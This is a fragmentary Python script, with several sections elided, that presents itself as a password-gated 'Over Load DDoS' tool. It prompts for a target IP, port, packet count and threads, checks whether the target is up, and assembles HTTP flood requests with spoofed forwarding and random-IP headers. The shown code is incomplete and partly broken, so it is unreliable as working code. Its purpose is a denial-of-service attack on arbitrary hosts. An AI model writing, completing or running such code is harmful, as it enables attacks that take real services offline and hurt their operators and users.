...
import os, time, random, threading, sys, socket
...
powerran = (random.randint(1,10000000))
print("             AiTroGanz Layer4             ")
print("             X             ")
print("             AsLtro Layer4             ")
print(" ")
print("             Over Load DDoS             ")
print(" ")
ip = str(input(" [ + ] Target IP ==> "))
port = int(input(" [ + ] Target PORT ==> "))
times = int(input(" [ + ] Target PACKET ==> "))
threads = int(input(" [ + ] Target THREADS ==> "))
os.system("clear")
password = str(input("AiTroGanz@[L4 AiTroGanz] --> "))
if password == "privateTools@1001":
    os.system("clear")
    time.sleep(3)
else:
    print("Passworld Error")
    time.sleep(3)
    print("HH")
...
def tcpping(ip,port):
    try:
        ...
        print(f"[DDOS-LOGS] Connection to {ip} on {port} its up")
        time.sleep(3)
    except:
        print(f"[DDOS-LOGS] Connection to {ip} on {port} its down")
        time.sleep(3)
...
def start():
    ...
    request = get_host + payload + referer + accept + useragent + connection + content + length + forward + forwards + randomip + data + request + "\r\n\r\n"
